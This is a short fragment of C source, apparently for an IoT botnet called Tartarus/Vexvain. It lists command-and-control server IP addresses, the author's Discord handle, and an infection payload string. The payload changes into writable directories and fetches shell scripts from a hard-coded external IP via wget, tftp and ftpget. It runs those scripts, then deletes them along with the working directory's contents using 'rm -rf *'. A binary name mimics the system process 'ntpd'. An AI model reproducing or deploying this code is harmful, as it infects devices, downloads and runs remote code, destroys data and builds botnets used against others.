...
// Vexvain ||
////////////////////////////////////////
unsigned char *Tartarus[] = {"185.244.25.189:23"}; // <ServerIP>:<BotPort> || Vexvain: {"185.244.25.189:23"}; || Jizz: {"165.227.72.112:23"};
unsigned char *AltServer[] = {"185.244.25.189:23"};  // {"23.254.244.244:23"}; || 
////////////////////////////////////////
char *vex_discord = "Vexvain#????";
////////////////////////////////////////
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
...
char *Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.189/Tartarus.sh; chmod 777 Tartarus.sh; sh Tartarus.sh; tftp 185.244.25.189 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.244.25.189; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.244.25.189 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Tartarus.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *";
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
char *bin_mips = "ntpd";
